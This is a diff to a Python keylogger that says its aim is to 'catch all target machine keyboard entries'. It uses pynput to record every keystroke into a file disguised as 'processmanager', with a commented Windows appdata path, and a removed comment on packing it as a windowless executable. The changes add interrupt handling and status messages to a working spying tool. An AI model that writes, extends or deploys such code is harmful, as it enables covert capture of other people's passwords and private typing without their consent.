@@ -4,15 +4,14 @@
     Catch all target machine keyboard entries.
 """
 
-import os
+import os, sys
 from pynput.keyboard import Listener
 
 keys = []
 count = 0
 
-path = "processmanager.txt" # For linux machines
+path = "processmanager" # For linux machines
 #path = os.environ["appdata"] + "\\processmanager" # For windows machines
-# Install with pyinstaller keylogger.py --onefile --no-console
 
 def write_file(keys):
     with open(path, "a") as file:
@@ -28,7 +27,7 @@ def write_file(keys):
             elif key.find('space') > 0:
                 file.write(" ")
             elif key.find('caps_lock') > 0:
-                file.write("CAPS_LOCK")
+                file.write(" CAPS_LOCK ")
             elif key.find("Key"):
                 file.write(key)
 
@@ -42,6 +41,10 @@ def on_press(key):
         count = 0
         write_file(keys)
         keys = []
-
-with Listener(on_press=on_press) as Listener:
-    Listener.join()
+try:
+    print("[*] Key logging...")
+    with Listener(on_press=on_press) as Listener:
+        Listener.join()
+except KeyboardInterrupt:
+    print("[X] Keylogger closed.")
+    sys.exit(0)
